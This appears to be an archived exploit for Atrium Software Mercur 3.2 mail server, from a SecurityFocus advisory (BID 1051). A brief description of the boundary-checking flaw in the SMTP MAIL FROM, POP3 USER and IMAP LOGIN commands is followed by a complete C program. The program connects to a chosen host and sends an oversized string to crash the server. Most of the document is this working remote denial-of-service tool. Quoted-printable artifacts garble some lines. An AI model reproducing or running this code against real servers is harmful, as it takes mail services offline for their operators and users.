source: http://www.securityfocus.com/bid/1051/info

Atrium Software Mercur is a SMTP, POP3, and IMAP mail server. Insufficient boundary checking exists in the code that handles within the SMTP "mail from" command, the POP3 "user" command and the IMAP "login" command. The application will crash if an overly long string is used as an argument to any of these commands.


 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void
usage (char *progname)
{
  fprintf (stderr, "Usage: %s <hostname> [type]\n", progname);
  fprintf (stderr, "   Type:\n");
  fprintf (stderr, "      0 - IMAP4 (Default)\n");
  fprintf (stderr, "      1 - POP3\n");
  fprintf (stderr, "      2 - SMTP\n\n");
  exit (1);
}

int
main (int argc, char **argv)
{
  char *ptr, buffer[3000], remotedos[3100];
  int aux, sock, type;
  struct sockaddr_in sin;
  unsigned long ip;
  struct hostent *he;

  fprintf (stderr,
   "\n-=3D Remote DoS for Mercur 3.2 - (C) |[TDP]| - H13 Team =3D-\n");

  if (argc < 2)
    usage (argv[0]);

  type =3D 0;
  if (argc > 2)
    type =3D atol (argv[2]);

  ptr =3D buffer;
  switch (type)
    {
    case 1:
      memset (ptr, 0, 2048);
      memset (ptr, 88, 2046);
      break;
    default:
      memset (ptr, 0, sizeof (buffer));
      memset (ptr, 88, sizeof (buffer) - 2);
      break;
    }

  bzero (remotedos, sizeof (remotedos));

  switch (type)
    {
    case 1:
      snprintf (remotedos, sizeof (remotedos), "USER %s\r\n\r\n\r\n", =
buffer);
      break;
    case 2:
      snprintf (remotedos, sizeof (remotedos),
"MAIL FROM: %s@ThiSiSaDoS.c0m\r\n\r\n\r\n", buffer);
      break;
    default:
      snprintf (remotedos, sizeof (remotedos), "1000 LOGIN =
%s\r\n\r\n\r\n",
buffer);
      break;
    }

  if ((sock =3D socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    {
      perror ("socket()");
      return -1;
    }

  if ((he =3D gethostbyname (argv[1])) !=3D NULL)
    {
      ip =3D *(unsigned long *) he->h_addr;
    }
  else
    {
      if ((ip =3D inet_addr (argv[1])) =3D=3D NULL)
{
  perror ("inet_addr()");
  return -1;
}
    }

  sin.sin_family =3D AF_INET;
  sin.sin_addr.s_addr =3D ip;

  switch (type)
    {
    case 1:
      sin.sin_port =3D htons (110);
      break;
    case 2:
      sin.sin_port =3D htons (25);
      break;
    default:
      sin.sin_port =3D htons (143);
      break;
    }

  if (connect (sock, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
      perror ("connect()");
      return -1;
    }

  switch (type)
    {
    case 1:
      fprintf (stderr, "\nEngaged Mercur POP3... Sending data...\n");
      break;
    case 2:
      fprintf (stderr, "\nEngaged Mercur SMTP... Sending data...\n");
      break;
    default:
      fprintf (stderr, "\nEngaged Mercur IMAP4... Sending data...\n");
      break;
    }

  if (write (sock, remotedos, strlen (remotedos)) < strlen (remotedos))
    {
      perror ("write()");
      return -1;
    }

  sleep (4);

  fprintf (stderr, "Bye Bye baby!...\n\n");
  if (close (sock) < 0)
    {
      perror ("close()");
      return -1;
    }

  return (0);
}
